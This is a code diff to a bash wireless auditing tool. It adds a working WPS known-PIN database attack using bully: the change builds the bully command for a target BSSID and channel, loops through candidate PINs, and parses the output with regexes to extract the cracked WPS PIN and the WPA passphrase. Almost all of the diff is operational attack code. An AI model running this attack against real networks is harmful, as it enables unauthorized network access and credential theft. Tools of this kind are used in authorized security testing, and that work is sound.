@@ -4672,6 +4672,17 @@ function exec_wps_bruteforce_pin_reaver_attack() {
 	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -a -vvv && echo \"Close this window\"" > /dev/null 2>&1
 }
 
+#Execute wps pin database bully attack
+function exec_wps_pin_database_bully_attack() {
+
+	wps_pin_database_prerequisites
+
+	set_wps_attack_script "bully" "pindb"
+
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+}
+
 #Execute wps pin database reaver attack
 function exec_wps_pin_database_reaver_attack() {
 
@@ -5525,7 +5536,7 @@ function wps_attacks_menu() {
 	language_strings "${language}" 358 reaver_pixie_dust_attack_dependencies[@]
 	language_strings "${language}" 347 bully_attacks_dependencies[@]
 	language_strings "${language}" 359 reaver_attacks_dependencies[@]
-	language_strings "${language}" 348 "under_construction" #bully_attacks_dependencies[@]
+	language_strings "${language}" 348 bully_attacks_dependencies[@]
 	language_strings "${language}" 360 reaver_attacks_dependencies[@]
 	print_simple_separator
 	language_strings "${language}" 361
@@ -5650,7 +5661,30 @@ function wps_attacks_menu() {
 			if [ "$?" = "0" ]; then
 				forbidden_menu_option
 			else
-				under_construction_message
+				get_bully_version
+				set_bully_verbosity
+				if [ -z "${scriptfolder}" ]; then
+					set_script_folder
+				fi
+
+				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
+					check_pins_database_file
+					if [ "$?" = "0" ]; then
+						echo
+						language_strings "${language}" 373 "blue"
+					else
+						echo
+						language_strings "${language}" 372 "yellow"
+					fi
+				else
+					echo
+					language_strings "${language}" 379 "blue"
+				fi
+				language_strings "${language}" 115 "read"
+				wps_standard_attacks_parameters
+				if [ "$?" = "0" ]; then
+					exec_wps_pin_database_bully_attack
+				fi
 			fi
 		;;
 		12)
@@ -6775,12 +6809,11 @@ function set_wps_attack_script() {
 			#	#TODO pending
 			#;;
 		esac
-	#else
-		#TODO pending for bully
-		#case ${wps_attack_mode} in
-			#"pindb")
-			#	#TODO pending
-			#;;
+	else
+		case ${wps_attack_mode} in
+			"pindb")
+				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p "
+			;;
 			#"custompin")
 				#TODO pending
 			#;;
@@ -6790,7 +6823,7 @@ function set_wps_attack_script() {
 			#"bruteforce")
 			#	#TODO pending
 			#;;
-		#esac
+		esac
 	fi
 
 	attack_cmd2=" | tee ${tmpdir}${wps_out_file}"
@@ -6832,28 +6865,57 @@ function set_wps_attack_script() {
 				success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
 				pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
 				password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
-			#else
-				#TODO pending regexp for bully
+			else
+				failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
+				success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
+				success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
 			fi
 
 			for item in "${LINES_TO_PARSE[@]}"; do
-				if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
-					if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
-						cracked_pin="${BASH_REMATCH[1]}"
+				if [ "${script_wps_attack_tool}" = "reaver" ]; then
+					if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
+						if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
+							cracked_pin="${BASH_REMATCH[1]}"
+							continue
+						elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
+							cracked_password="${BASH_REMATCH[1]}"
+							return 0
+						fi
+						pin_cracked=1
 						continue
-					elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
-						cracked_password="${BASH_REMATCH[1]}"
-						return 0
+					elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
+						return 2
+					elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
+						return 1
 					fi
-					pin_cracked=1
-					continue
-				elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
-					return 2
-				elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
-					return 1
+				else
+					if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
+						cracked_pin="${BASH_REMATCH[1]}"
+						cracked_password="${BASH_REMATCH[2]}"
+						pin_cracked=1
+						return 0
+					elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
+						return 1
+					elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
+						return 2
+					fi
 				fi
 			done
-			return 1
+			return 3
+		}
+	EOF
+
+	cat >&7 <<-EOF
+
+		#Prints message for waiting output
+		function print_waiting_output() {
+
+			echo
+			waiting_msg="${white_color}Waiting output, be patient...${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+			echo -e "${waiting_msg}"
 		}
 	EOF
 
@@ -6862,7 +6924,7 @@ function set_wps_attack_script() {
 		function print_pin_timeout() {
 
 			echo
-			timeout_msg="${white_color}Timeout for last PIN"
+			timeout_msg="${white_color}Timeout for last PIN${normal_color}"
 	EOF
 
 	cat >&7 <<-'EOF'
@@ -6873,7 +6935,10 @@ function set_wps_attack_script() {
 		if [ "${script_wps_attack_mode}" = "pindb" ]; then
 			this_pin_timeout=0
 			for current_pin in "${script_pins_found[@]}"; do
-				clear
+				possible_bully_timeout=0
+				if [ ${attack_pin_counter} -ne 1 ]; then
+					sleep 1.5
+				fi
 				bad_attack_this_pin_counter=0
 				if [ "${this_pin_timeout}" -eq 1 ]; then
 					print_pin_timeout
@@ -6881,15 +6946,28 @@ function set_wps_attack_script() {
 				echo
 				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
 				this_pin_timeout=0
+				if [ "${script_wps_attack_tool}" = "bully" ]; then
+					print_waiting_output
+				fi
 				(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2}")
 				if [ "$?" = "124" ]; then
-					this_pin_timeout=1
+				 	if [ "${script_wps_attack_tool}" = "reaver" ]; then
+						this_pin_timeout=1
+					else
+						possible_bully_timeout=1
+					fi
 				fi
 				attack_pin_counter=$((attack_pin_counter + 1))
 				parse_output
-				if [ "$?" = "0" ]; then
+				output="$?"
+				if [ "${output}" = "0" ]; then
 					break
-				elif [[ "$?" = "1" ]] || [[ "${this_pin_timeout}" -eq 1 ]]; then
+				elif [ "${output}" = "1" ]; then
+					this_pin_timeout=1
+					continue
+				elif [ "${output}" = "2" ]; then
+					continue
+				elif [[ "${output}" = "3" ]] || [[ "${this_pin_timeout}" -eq 1 ]] || [[ ${possible_bully_timeout} -eq 1 ]]; then
 					if [ "${this_pin_timeout}" -eq 1 ]; then
 						continue
 					fi
@@ -6898,8 +6976,11 @@ function set_wps_attack_script() {
 						this_pin_timeout=1
 						continue
 					fi
+					if [ ${possible_bully_timeout} -eq 1 ]; then
+						this_pin_timeout=1
+						continue
+					fi
 				fi
-				sleep 1.5
 			done
 		#else
 			#TODO pending
